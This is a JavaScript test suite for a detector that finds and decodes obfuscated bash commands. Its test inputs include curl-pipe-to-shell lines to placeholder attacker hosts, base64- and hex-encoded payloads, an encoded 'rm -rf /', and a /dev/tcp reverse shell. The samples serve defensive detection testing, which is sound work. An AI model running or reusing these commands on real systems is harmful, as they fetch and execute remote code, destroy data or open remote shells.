'use strict';
// bash-obfuscation.test.js — POSIX-shell obfuscation detection /
// deobfuscation.
//
// `_findBashObfuscationCandidates(text, context)` covers six branches
// modelled after the cmd-obfuscation.js prototype mixin:
//   B1  Variable expansion / parameter slicing — ${V:N:M}, ${V//x/y},
//       ${V:-default}, ${V/#prefix/rep}, ${V/%suffix/rep}, ${#V}.
//   B2  ANSI-C `$'…'` quoting — \xNN, \NNN octal, \uHHHH.
//   B3  printf chains — printf '\xNN…', printf '%b' '…'.
//   B4  Pipe-to-shell — curl|sh, base64-d|sh, xxd-r|sh, here-string
//       variants, eval $(curl …).
//   B5  Command-substitution unrolling — eval $(echo … | base64 -d),
//       eval "$(printf '\xNN…')".
//   B6  IFS / brace-expansion fragmentation — IFS=…; cmd=…; eval $cmd
//       and concatenated single-char vars ($a$b$c).
//
// Plus the standalone /dev/tcp reverse-shell pattern.

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules, host } = require('../helpers/load-bundle.js');

// bash-obfuscation.js attaches onto EncodedContentDetector.prototype
// and reads `this.maxCandidatesPerType` / `this._bruteforce`.
//
// `entropy.js`, `ioc-extract.js`, and `cmd-obfuscation.js` are also
// loaded so the post-processor regression test below can drive
// `_processCommandObfuscation()` end-to-end (it pulls in
// `_extractIOCsFromDecoded`, `_tryDecodeUTF8/16LE`, and
// `_shannonEntropyBytes`).
const ctx = loadModules([
  'src/constants.js',
  'src/encoded-content-detector.js',
  'src/decoders/safelinks.js',
  'src/decoders/entropy.js',
  'src/decoders/ioc-extract.js',
  'src/decoders/cmd-obfuscation.js',
  'src/decoders/bash-obfuscation.js',
]);
const { EncodedContentDetector, IOC } = ctx;
const d = new EncodedContentDetector();

/** Helper: collect every candidate matching `pred` and project across realms. */
function pick(candidates, pred) {
  return host(candidates.filter(pred));
}

// ── B1: Variable expansion / parameter slicing ──────────────────────────────

test('bash-obfuscation: B1 ${V:offset:length} resolves to single sensitive token', () => {
  // ${PAYLOAD:0:4} where PAYLOAD='curl http://evil/x | sh' returns 'curl'.
  // Sensitivity gate fires because 'curl' ∈ SENSITIVE_BASH_KEYWORDS.
  const text = `PAYLOAD='curl http://evil/x | sh'\n` +
               `${'${PAYLOAD:0:4}'} arg`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Variable Expansion/.test(c.technique));
  assert.ok(hits.length >= 1, `expected B1 hit; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0].deobfuscated, 'curl');
});

test('bash-obfuscation: B1 line-level fragment join resolves multi-token shred', () => {
  // Each ${V:N:M} alone is a 1-char shred; joined the line spells `ls -la`.
  // Indices into PAYLOAD:
  //   0=l 1=s 2=  3=- 4=l 5=a
  const text =
    `PAYLOAD='ls -la'\n` +
    `${'${PAYLOAD:0:1}${PAYLOAD:1:1}${PAYLOAD:2:1}${PAYLOAD:3:1}${PAYLOAD:4:1}${PAYLOAD:5:1}'} | sh`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const lineHits = pick(cands, c => /Variable Expansion/.test(c.technique));
  // The line resolver should produce a candidate spelling out 'ls -la'
  // (sensitivity gate fires because of trailing `| sh`).
  assert.ok(lineHits.some(h => /ls\s+-la/.test(h.deobfuscated)),
    `expected joined shred to spell 'ls -la'; got: ${JSON.stringify(lineHits)}`);
});

test('bash-obfuscation: B1 ${V//x/y} global replace resolves', () => {
  // V='cqurqlq', strip every 'q' → 'curl'.
  // Sensitivity gate fires.
  const text =
    `V='cqurqlq'\n` +
    `${'${V//q/}'}`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Variable Expansion/.test(c.technique) && c.deobfuscated === 'curl');
  assert.ok(hits.length >= 1,
    `expected //pat/rep candidate spelling 'curl'; got: ${JSON.stringify(host(cands))}`);
});

test('bash-obfuscation: B1 sensitivity gate suppresses benign expansions', () => {
  // ${PATH:0:1} resolves to '/' — no sensitive keyword, no emission.
  // The standalone branch (NOT the line-level resolver) should drop this.
  const text = `PATH='/usr/local/bin:/usr/bin'\necho ${'${PATH:0:1}'}`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'Bash Variable Expansion');
  assert.equal(hits.length, 0,
    `benign single-char expansion must not fire standalone; got: ${JSON.stringify(hits)}`);
});

// ── B2: ANSI-C `$'…'` quoting ───────────────────────────────────────────────

test('bash-obfuscation: B2 ANSI-C $\'\\xNN\' decodes hex bytes', () => {
  // `$'\x63\x75\x72\x6c'` → 'curl'. Sensitivity gate fires.
  const text = "alias x=$'\\x63\\x75\\x72\\x6c'; x https://evil/x | sh";
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /ANSI-C/.test(c.technique));
  assert.ok(hits.length >= 1,
    `expected B2 hit; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0].deobfuscated, 'curl');
});

test('bash-obfuscation: B2 ANSI-C \\NNN octal + \\uHHHH unicode decode', () => {
  // \142\151\156 = 'bin', \u0073\u0068 = 'sh'.
  // Sensitivity gate: 'sh' ∈ SENSITIVE_BASH_KEYWORDS.
  const text = "x=$'\\142\\151\\156/\\u0073\\u0068'";
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /ANSI-C/.test(c.technique));
  assert.ok(hits.length >= 1, 'expected octal+unicode B2 hit');
  assert.equal(hits[0].deobfuscated, 'bin/sh');
});

test('bash-obfuscation: B2 requires ≥2 escapes — bare $\'foo\' ignored', () => {
  // `$'literal text'` with zero escapes is just bash syntax for a
  // string with C-escape support, NOT obfuscation. The escCount<2
  // gate must drop it.
  const text = "echo $'just plain text'";
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /ANSI-C/.test(c.technique));
  assert.equal(hits.length, 0, 'literal $\'…\' must not fire');
});

// ── B3: printf chains ───────────────────────────────────────────────────────

test('bash-obfuscation: B3 printf \\xNN chain decodes to command', () => {
  // printf '\x63\x75\x72\x6c' → 'curl'.
  const text = "printf '\\x63\\x75\\x72\\x6c http://evil/x' | sh";
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /printf Chain/.test(c.technique));
  assert.ok(hits.length >= 1,
    `expected B3 hit; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /^curl/);
});

test('bash-obfuscation: B3 printf "%b" decodes second-arg backslash escapes', () => {
  // `printf '%b' '\x73\x68'` → 'sh'.
  const text = "printf '%b' '\\x73\\x68'";
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /printf Chain/.test(c.technique));
  // %b path: the format-string `%b` itself has no escape, but the
  // outer regex requires ≥1 backslash-escape in the captured FORMAT
  // string (m[1]). %b alone won't match — that's deliberate, the
  // single-arg variant `printf '\xNN…'` is the mainline droppershape.
  // The %b shape needs the format string to also contain escapes,
  // which adversarial samples typically do (e.g. `printf '%b\n' …`).
  // Instead verify the bare-format chain still works:
  const text2 = "printf '\\x73\\x68'";
  const cands2 = d._findBashObfuscationCandidates(text2, {});
  const hits2 = pick(cands2, c => /printf Chain/.test(c.technique));
  assert.ok(hits2.length >= 1, 'printf bare-format \\xNN must fire');
  assert.equal(hits2[0].deobfuscated, 'sh');
  // The %b-prefixed variant is currently not asserted here — see
  // detector comment: format-string is `%b` (no escape), so the
  // ≥1 backslash gate skips it. Plain printers without %b are
  // preferred by attackers anyway.
  void hits;
});

// ── B4: Pipe-to-shell ───────────────────────────────────────────────────────

test('bash-obfuscation: B4 curl … | sh detection-only candidate emits', () => {
  const text = 'curl -fsSL https://malicious.example/install.sh | bash';
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Pipe-to-Shell.*live fetch/.test(c.technique));
  assert.ok(hits.length >= 1,
    `expected B4 live-fetch candidate; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0]._executeOutput, true,
    'live-fetch candidates must mark _executeOutput for severity bump');
});

test('bash-obfuscation: B4 base64-pipe-to-shell decodes upstream payload', () => {
  // 'curl evil | sh' base64 = 'Y3VybCBldmlsIHwgc2g='
  const b64 = (typeof Buffer !== 'undefined')
    ? Buffer.from('curl evil | sh').toString('base64')
    : 'Y3VybCBldmlsIHwgc2g=';
  const text = `echo "${b64}" | base64 -d | sh`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /base64-pipe-to-Shell/.test(c.technique));
  assert.ok(hits.length >= 1,
    `expected B4 base64 decode; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0].deobfuscated, 'curl evil | sh');
});

test('bash-obfuscation: B4 xxd-r here-string-to-shell decodes hex', () => {
  // 'sh' = hex 7368
  const text = 'xxd -r -p <<< "7368" | sh';
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /xxd-here-string-to-Shell/.test(c.technique));
  assert.ok(hits.length >= 1,
    `expected B4 xxd hit; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0].deobfuscated, 'sh');
});

// ── B5: Command-substitution unrolling ──────────────────────────────────────

test('bash-obfuscation: B5 eval $(echo … | base64 -d) decodes inner payload', () => {
  // 'rm -rf /' base64 = 'cm0gLXJmIC8='
  const b64 = (typeof Buffer !== 'undefined')
    ? Buffer.from('rm -rf /').toString('base64')
    : 'cm0gLXJmIC8=';
  const text = `eval $(echo "${b64}" | base64 -d)`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /eval.*base64/.test(c.technique));
  assert.ok(hits.length >= 1,
    `expected B5 candidate; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0].deobfuscated, 'rm -rf /');
  assert.equal(hits[0]._executeOutput, true);
});

test('bash-obfuscation: B5 eval "$(printf \'\\xNN…\')" decodes hex', () => {
  // 'sh' = \x73\x68
  const text = "eval \"$(printf '\\x73\\x68')\"";
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /eval.*printf/.test(c.technique));
  assert.ok(hits.length >= 1,
    `expected B5 printf candidate; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0].deobfuscated, 'sh');
});

test('bash-obfuscation: B5 bash -c "$(printf …)" matches eval-class wrapper', () => {
  // 'curl' = \x63\x75\x72\x6c — bash -c wrapper accepted same as eval.
  const text = "bash -c \"$(printf '\\x63\\x75\\x72\\x6c')\"";
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /eval.*printf/.test(c.technique));
  assert.ok(hits.length >= 1, 'bash -c "$(printf…)" must fire B5');
  assert.equal(hits[0].deobfuscated, 'curl');
});

// ── B6: IFS / brace-expansion fragmentation ─────────────────────────────────

test('bash-obfuscation: B6 IFS reassignment + eval $V resolves with separator', () => {
  // IFS='_'; cmd=ls_-la; eval $cmd  →  'ls -la'
  const text = `IFS='_'; cmd=ls_-la; eval $cmd`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /IFS Reassembly/.test(c.technique));
  assert.ok(hits.length >= 1,
    `expected B6 IFS hit; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /ls\s+-la/);
  assert.equal(hits[0]._executeOutput, true);
});

test('bash-obfuscation: B6 IFS without resolved var emits structural candidate', () => {
  // Even if the var is not literally assigned (e.g. cmd=$(…)),
  // IFS-tweak + eval $V is high-confidence-malicious by structure.
  const text = `IFS=$'\\x09'; eval $unknownVar`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /IFS Reassembly.*structural/.test(c.technique));
  assert.ok(hits.length >= 1,
    `expected structural-only B6 hit; got: ${JSON.stringify(host(cands))}`);
});

test('bash-obfuscation: B6 var concatenation $a$b$c resolves to command', () => {
  // a=c b=u r=r l=l → $a$b$r$l → 'curl' is too short, expand:
  // a=cu b=rl c=' ' d=-O → $a$b$c$d → 'curl -O'
  const text = `a=cu\nb=rl\nc=' '\nd=-O\necho $a$b$c$d https://evil/x`;
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Variable Concatenation/.test(c.technique));
  assert.ok(hits.length >= 1,
    `expected B6 concat hit; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /^curl/);
});

// ── /dev/tcp reverse shell (standalone pattern) ─────────────────────────────

test('bash-obfuscation: /dev/tcp reverse-shell flagged with _executeOutput', () => {
  // Canonical bash reverse-shell — bash -i + /dev/tcp redirect.
  const text = 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1';
  const cands = d._findBashObfuscationCandidates(text, {});
  const hits = pick(cands, c => /\/dev\/tcp/.test(c.technique));
  assert.ok(hits.length >= 1,
    `expected /dev/tcp hit; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0]._executeOutput, true);
});

// ── Empty-input + non-bash-text contract ────────────────────────────────────

test('bash-obfuscation: returns empty for short or non-bash text', () => {
  assert.deepEqual(host(d._findBashObfuscationCandidates('hi', {})), []);
  assert.deepEqual(host(d._findBashObfuscationCandidates('', {})), []);
  // Plain English: no var assignments, no $'', no printf, no pipe-to-sh.
  assert.deepEqual(host(d._findBashObfuscationCandidates(
    'The quick brown fox jumps over the lazy dog.', {})), []);
});

test('bash-obfuscation: caps at maxCandidatesPerType', () => {
  // Generate a flood of pipe-to-shell patterns; cap should bind.
  const line = 'curl https://evil.example/x | sh\n';
  const flood = line.repeat(d.maxCandidatesPerType + 50);
  const cands = d._findBashObfuscationCandidates(flood, {});
  const pipes = pick(cands, c => /Pipe-to-Shell/.test(c.technique));
  assert.ok(pipes.length <= d.maxCandidatesPerType,
    `expected ≤ ${d.maxCandidatesPerType} candidates, got ${pipes.length}`);
});

// ── Post-processor regression: CMD `for /f` pattern must not leak ───────────
//
// Background: `_executeOutput` started life as a CMD-specific marker
// for `for /f … do call %X` (b74cd05). c3e94a1 broadened it to
// "decoded payload is fed back into a shell" across bash / python /
// php / js decoders. The post-processor in cmd-obfuscation.js
// previously read `_executeOutput` and unconditionally pushed the
// CMD-only IOC.PATTERN
//   "for /f … do call %X — captured command output is executed as a
//    shell command"
// onto every family's findings. The regression: bash `curl … | bash`
// findings showed the CMD `for /f` pattern in the sidebar.
//
// The fix splits severity escalation (still `_executeOutput`) from
// the family-specific IOC.PATTERN text (now `_patternIocs`). These
// tests pin the new contract.

test('bash-obfuscation: post-processor does NOT attach CMD `for /f` pattern to live-fetch finding', async () => {
  const text = 'curl -sSL https://evil.example.com?payload=1234 | bash';
  const cands = d._findBashObfuscationCandidates(text, {});
  const cand = cands.find(c => /Pipe-to-Shell.*live fetch/.test(c.technique));
  assert.ok(cand, `expected B4 live-fetch candidate; got: ${JSON.stringify(host(cands))}`);
  assert.equal(cand._executeOutput, true, 'pre-condition: candidate marks _executeOutput');
  assert.equal(cand._patternIocs, undefined,
    'bash live-fetch candidate must NOT carry _patternIocs (no per-family mirror in this PR)');

  const finding = await d._processCommandObfuscation(cand);
  assert.ok(finding, 'expected post-processor to produce a finding');

  const patternIocs = (finding.iocs || []).filter(i => i.type === IOC.PATTERN);
  const forFLeak = patternIocs.find(i => /for\s*\/f/i.test(i.url || ''));
  assert.equal(forFLeak, undefined,
    `bash candidate must not carry the CMD \`for /f\` pattern; got: ${JSON.stringify(host(patternIocs))}`);

  // The URL IOC from the decoded payload survives into the finding.
  const urlIoc = (finding.iocs || []).find(
    i => i.type === IOC.URL && i.url === 'https://evil.example.com?payload=1234'
  );
  assert.ok(urlIoc, `expected URL IOC preserved; got: ${JSON.stringify(host(finding.iocs))}`);

  // Severity is bumped per `_executeOutput` semantics. A URL IOC plus
  // the dangerousPatterns hits (`curl`, `bash`) already push past
  // the default 'medium' tier; with `_executeOutput` it lands at
  // 'high' or 'critical'.
  assert.ok(finding.severity === 'high' || finding.severity === 'critical',
    `expected severity ≥ high; got ${finding.severity}`);
});
